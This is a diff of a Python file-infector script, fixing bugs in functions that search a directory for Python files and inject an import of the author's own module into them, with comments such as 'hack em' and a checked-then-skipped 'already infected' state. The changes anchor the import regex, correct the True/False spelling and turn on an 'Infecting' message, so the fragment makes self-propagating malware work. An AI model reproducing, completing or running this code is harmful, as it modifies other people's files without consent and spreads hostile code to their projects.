@@ -83,7 +83,7 @@ def infect_file(file_path):
     if DEST_MODULE_NAME[:-3] in old_content:
         return      # return if it's already infected
 
-    res = re.search('import(.+?)\n', old_content)   # find the first import line
+    res = re.search('^import(.+?)\n', old_content)   # find the first import line
     if res:     
         current_imp = res.group(1)
         # make a new import block that has our module
@@ -106,8 +106,8 @@ def should_infect(pth):
     fname = pth.split('/')[-1]
     if fname in INCLUDE_LIST:
         print(fname)
-        return true
-    return false
+        return True
+    return False
 
 
 def infect(search_dir):
@@ -121,7 +121,7 @@ def infect(search_dir):
     py_files = find_py(search_dir)  # find python
     for f in py_files:
         if should_infect(f):
-            #print("Infecting " + f + "...")
+            print("Infecting " + f + "...")
             infect_file(f)      # hack em
     return
 
